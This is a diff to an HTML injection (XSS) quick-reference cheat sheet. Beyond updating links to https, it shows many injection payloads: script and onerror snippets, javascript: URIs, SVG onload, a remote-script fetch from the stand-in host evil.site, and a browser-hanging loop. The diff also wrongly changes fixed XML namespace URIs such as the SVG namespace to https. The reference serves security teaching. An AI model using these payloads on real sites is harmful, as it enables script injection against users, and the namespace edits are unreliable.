@@ -108,17 +108,17 @@ body {
 <tr>
   <td rowspan="6">JavaScript Window.location object property<br><span class="placeholder">.hash<br>.href<br>.pathname<br>.search</span>
   <td rowspan="2" class="char">URL
-  <td>http://web.site/page/<span class="payload">&lt;script&gt;☣&lt;script&gt;</span>
+  <td>https://web.site/page/<span class="payload">&lt;script&gt;☣&lt;script&gt;</span>
   <tr>
   <td class="example">&lt;script&gt;<br>document.write("Page not found: " + window.location);<br>...
   <tr>
   <td rowspan="2" class="char">#<span class="placeholder">fragment</span>
-  <td>http://web.site/page<span class="payload">#&lt;script&gt;☣&lt;script&gt;</span>
+  <td>https://web.site/page<span class="payload">#&lt;script&gt;☣&lt;script&gt;</span>
   <tr>
   <td class="example">&lt;script&gt;<br>document.write(window.location);<br>...
   <tr>
   <td rowspan="2" class="char">#<span class="placeholder">jQuery</span><sup><a href="#jquery_example">3</a></sup>
-  <td>http://web.site/page<span class="payload">#&lt;img/src=%22%22onerror=☣&gt;</span>
+  <td>https://web.site/page<span class="payload">#&lt;img/src=%22%22onerror=☣&gt;</span>
   <tr>
   <td class="example">&lt;script&gt;<br>$(document).ready(function() {<br>
     &nbsp;&nbsp;var x = (window.location.hash.match(/^#([^\/].+)$/) || [])[1];<br>
@@ -137,11 +137,11 @@ body {
   <th colspan="3">Footnotes
 <tr>
   <td id="html5_syntax" colspan="3" class="footnote"><sup>1</sup> The biohazard symbol (U+2623) -- &#x2623; -- in each example represents a JavaScript payload. It could be anything from a while loop to DoS the browser, e.g. <span class="placeholder">var a;while(1){a+="a"}</span> to the ubiquitous <span class="placeholder">alert(9)</span>. One of the safest payloads to use is <span class="placeholder">console.log(id)</span> where the id is a unique identifier. Not only is a log message unobtrusive, but the identifier helps identify when an injection point and reflection point are on different resources. In any case, these categories focus on the placement of the payload within the rendered document rather than the nature of the payload's execution.
-<br>Though it seems daunting to review the <a href="http://www.w3.org/TR/html5/syntax.html#syntax">HTML5 syntax</a> specification, doing so aids in understanding how HTML is supposed to be formed. HTML5 defines an explicit algorithm for <a href="http://www.w3.org/TR/html5/parsing.html#parsing">parsing HTML documents</a>. Read through the spec to become familiar with the expectations of Unicode code points, parse errors, and decisions a User Agent may make when dealing with markup. A standardized approach to parsing is supposed to minimize the quirks and differences among browsers, thus removing a historical source of insecurity. The <a href="http://www.w3.org/TR/html401/">HTML4 spec</a> was not as clear or as rigourous on parsing.
+<br>Though it seems daunting to review the <a href="https://www.w3.org/TR/html5/syntax.html#syntax">HTML5 syntax</a> specification, doing so aids in understanding how HTML is supposed to be formed. HTML5 defines an explicit algorithm for <a href="https://www.w3.org/TR/html5/parsing.html#parsing">parsing HTML documents</a>. Read through the spec to become familiar with the expectations of Unicode code points, parse errors, and decisions a User Agent may make when dealing with markup. A standardized approach to parsing is supposed to minimize the quirks and differences among browsers, thus removing a historical source of insecurity. The <a href="https://www.w3.org/TR/html401/">HTML4 spec</a> was not as clear or as rigourous on parsing.
 <tr>
-  <td id="html5_comment" colspan="3" class="footnote"><sup>2</sup> Sometimes it's helpful to insert a space before the --&gt; to ensure the tag is interpreted. [ <a href="http://www.w3.org/TR/html5/syntax.html#comments">HTML5 comments</a> ]
+  <td id="html5_comment" colspan="3" class="footnote"><sup>2</sup> Sometimes it's helpful to insert a space before the --&gt; to ensure the tag is interpreted. [ <a href="https://www.w3.org/TR/html5/syntax.html#comments">HTML5 comments</a> ]
 <tr>
-  <td id="jquery_example" colspan="3" class="footnote"><sup>3</sup> This is a quirk of jQuery's design choice for overloading the <a href="http://api.jquery.com/jQuery/">$() API</a> to accept selectors or elements. Read about the interplay of JavaScript and Content Security Policy on the <a href="http://deadliestwebattacks.com/2012/10/31/javascript-is-harmless/">blog</a>.
+  <td id="jquery_example" colspan="3" class="footnote"><sup>3</sup> This is a quirk of jQuery's design choice for overloading the <a href="https://api.jquery.com/jQuery/">$() API</a> to accept selectors or elements.
 </table>
 <div style="text-align: right"><a href="#hiqr_toc">top</a></div>
 <hr>
@@ -174,7 +174,7 @@ body {
   <tr>
   <td class="example">&lt;a href="java&amp;#x0073;cript:alert(9)"&gt;foo&lt;/a&gt;
 <tr>
-  <td rowspan="4">JavaScript inline event handlers<a href="#csp_unsafe-inline"><sup>1</sup></a><br>[ <a href="http://www.w3.org/TR/html401/interact/scripts.html#h-18.2.3">html4</a> | <a href="http://www.w3.org/TR/html5/webappapis.html#event-handlers-on-elements,-document-objects,-and-window-objects">html5</a> ]
+  <td rowspan="4">JavaScript inline event handlers<a href="#csp_unsafe-inline"><sup>1</sup></a><br>[ <a href="https://www.w3.org/TR/html401/interact/scripts.html#h-18.2.3">html4</a> | <a href="https://www.w3.org/TR/html5/webappapis.html#event-handlers-on-elements,-document-objects,-and-window-objects">html5</a> ]
   <td>Unquoted
   <td class="example">&lt;input type=text name=foo value=<span class="payload">a%20onchange=alert(9)</span>&gt;
   <tr>
@@ -210,15 +210,15 @@ body {
 <tr>
   <td rowspan="4">Alternate markup
   <td rowspan="4">SVG
-  <td class="example">&lt;svg onload="javascript:alert(9)" xmlns="http://www.w3.org/2000/svg"&gt;&lt;/svg&gt;
+  <td class="example">&lt;svg onload="javascript:alert(9)" xmlns="https://www.w3.org/2000/svg"&gt;&lt;/svg&gt;
   <tr>
-  <td class="example">&lt;svg xmlns="http://www.w3.org/2000/svg"&gt;<br>
+  <td class="example">&lt;svg xmlns="https://www.w3.org/2000/svg"&gt;<br>
 &lt;g onload="javascript:alert(9)"&gt;&lt;/g&gt;&lt;/svg&gt;
   <tr>
   <td class="example">&lt;svg&gt;&lt;script xlink:href=data:,alert(9)&gt;&lt;/script&gt;
   <tr>
-  <td class="example">&lt;svg xmlns="http://www.w3.org/2000/svg"&gt;<br>
-&lt;a xmlns:xlink="http://www.w3.org/1999/xlink" xlink:href="javascript:alert(9)"&gt;<br>
+  <td class="example">&lt;svg xmlns="https://www.w3.org/2000/svg"&gt;<br>
+&lt;a xmlns:xlink="https://www.w3.org/1999/xlink" xlink:href="javascript:alert(9)"&gt;<br>
 &lt;rect width="1000" height="1000" fill="white"/&gt;&lt;/a&gt;&lt;/svg&gt;
 <tr>
   <td rowspan="8">Untidy markup
@@ -255,14 +255,14 @@ body {
   <tr>
   <td class="example">&lt;a id=' href=""&gt;'href=javascript:alert(9)&gt;foo&lt;/a&gt;
   <tr>
-  <td class="example">&lt;a id='href=http://web.site/'onclick=alert(9)&gt;foo&lt;/a&gt;
+  <td class="example">&lt;a id='href=https://web.site/'onclick=alert(9)&gt;foo&lt;/a&gt;
   <tr>
   <td class="example">&lt;a href= . '"\' onclick=alert(9) '"'&gt;foo&lt;/a&gt;
   <tr>
   <td rowspan="2">Quote confusion with element
   <td class="example">&lt;img src="\"'&lt;a href='"&gt;"'onerror=alert(9)&gt;
   <tr>
-  <td class="example">&lt;a id='http://web.site/'onclick=alert(9)&lt;!--href=a&gt;foo&lt;/a&gt;--&gt;
+  <td class="example">&lt;a id='https://web.site/'onclick=alert(9)&lt;!--href=a&gt;foo&lt;/a&gt;--&gt;
   <tr>
   <td>Quote mixing with element
   <td class="example">&lt;img src="'"id='&lt;img src=""&gt;'onerror=alert(9)&gt;
@@ -275,9 +275,9 @@ body {
 <tr>
   <th colspan="3">Footnotes
 <tr>
-  <td id="csp_unsafe-inline" colspan="3" class="footnote"><sup>1</sup> HTML5's Content Security Policy headers can neutralize these attacks by preventing the User Agent from executing JavaScript within this context unless the page author is forced to include the <a href="http://www.w3.org/TR/CSP/#directives">"unsafe-inline" directive</a>.
+  <td id="csp_unsafe-inline" colspan="3" class="footnote"><sup>1</sup> HTML5's Content Security Policy headers can neutralize these attacks by preventing the User Agent from executing JavaScript within this context unless the page author is forced to include the <a href="https://www.w3.org/TR/CSP/#directives">"unsafe-inline" directive</a>.
 <tr>
-  <td id="data_uri" colspan="3" class="footnote"><sup>2</sup> The basic format is <span class="placeholder">dataurl := "data:" [ mediatype ] [ ";base64" ] "," data</span>. The scheme is defined in <a href="http://tools.ietf.org/html/rfc2397">RFC 2397</a>.
+  <td id="data_uri" colspan="3" class="footnote"><sup>2</sup> The basic format is <span class="placeholder">dataurl := "data:" [ mediatype ] [ ";base64" ] "," data</span>. The scheme is defined in <a href="https://tools.ietf.org/html/rfc2397">RFC 2397</a>.
 <tr>
   <td id="html5_attribute_name_state" colspan="3" class="footnote"><sup>3</sup> Per <a href="https://dev.w3.org/html5/spec/single-page.html#attribute-name-state">HTML5 spec</a>, <cite>"When the user agent leaves the attribute name state (and before emitting the tag token, if appropriate), the complete attribute's name must be compared to the other attributes on the same token; if there is already an attribute on the token with the exact same name, then this is a parse error and the new attribute must be dropped, along with the value that gets associated with it (if any)."</cite>
 </table>
@@ -326,7 +326,7 @@ body {
   <tr>
   <td class="example">angular.element.apply(alert(9))
   <tr>
-  <td><a href="http://emberjs.com/">Ember JS</a>
+  <td><a href="https://emberjs.com/">Ember JS</a>
   <td class="example">Ember.run(null, alert, 9)
   <tr>
   <td rowspan="4"><a href="https://jquery.com/">jQuery</a>
@@ -343,7 +343,7 @@ body {
   <tr>
   <td class="example">new Ajax.Request('//evil.site/')<br><span class="comment">(site serves <span class="payload">alert(9)</span> and CORS headers)</span>
   <tr>
-  <td rowspan="3"><a href="http://underscorejs.org/">Underscore</a>
+  <td rowspan="3"><a href="https://underscorejs.org/">Underscore</a>
   <td class="example">_.defer(alert, 9)
   <tr>
   <td class="example">_.delay(alert, 0, 9)
@@ -382,6 +382,6 @@ body {
 </table>
 <div style="text-align: right"><a href="#hiqr_toc">top</a></div>
 <br>
-<a rel="license" href="http://creativecommons.org/licenses/by/4.0/"><img alt="Creative Commons License" style="border-width:0" src="https://i.creativecommons.org/l/by/4.0/88x31.png" /></a><br /><span xmlns:dct="http://purl.org/dc/terms/" href="http://purl.org/dc/dcmitype/Text" property="dct:title" rel="dct:type">HTML Injection Quick Reference</span> by <span xmlns:cc="http://creativecommons.org/ns#" property="cc:attributionName">Mike Shema</span> is licensed under a <a rel="license" href="http://creativecommons.org/licenses/by/4.0/">Creative Commons Attribution 4.0 International License</a>.
+<a rel="license" href="https://creativecommons.org/licenses/by/4.0/"><img alt="Creative Commons License" style="border-width:0" src="https://i.creativecommons.org/l/by/4.0/88x31.png" /></a><br /><span xmlns:dct="https://purl.org/dc/terms/" href="https://purl.org/dc/dcmitype/Text" property="dct:title" rel="dct:type">HTML Injection Quick Reference</span> by <span xmlns:cc="https://creativecommons.org/ns#" property="cc:attributionName">Mike Shema</span> is licensed under a <a rel="license" href="https://creativecommons.org/licenses/by/4.0/">Creative Commons Attribution 4.0 International License</a>.
 </body>
 </html>
